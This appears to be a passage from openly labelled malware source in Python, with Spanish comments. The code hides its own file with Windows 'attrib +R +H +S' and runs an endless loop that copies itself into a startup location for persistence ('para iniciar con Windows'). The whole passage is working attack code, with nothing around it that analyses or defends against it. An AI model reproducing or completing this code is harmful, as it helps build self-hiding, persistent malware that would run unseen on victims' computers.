...
actual_dir = os.path.dirname(os.path.realpath(__file__)) + malware_name + ".pyw"
os.system('attrib +R +H +S {a}'.format(a = actual_dir + malware_name + ".pyw"))

while True:
    # Guardar el malware para iniciar con Windows
    malware = os.popen("if EXIST {a} (echo Estado del malware: OK) else (copy {b} {c})".format(a = save_dir + malware_name + ".pyw", b = actual_dir, c = save_dir)).read()

    # Esconder
    os.system('attrib +R +H +S {a}'.format(a = save_dir + malware_name + ".pyw"))
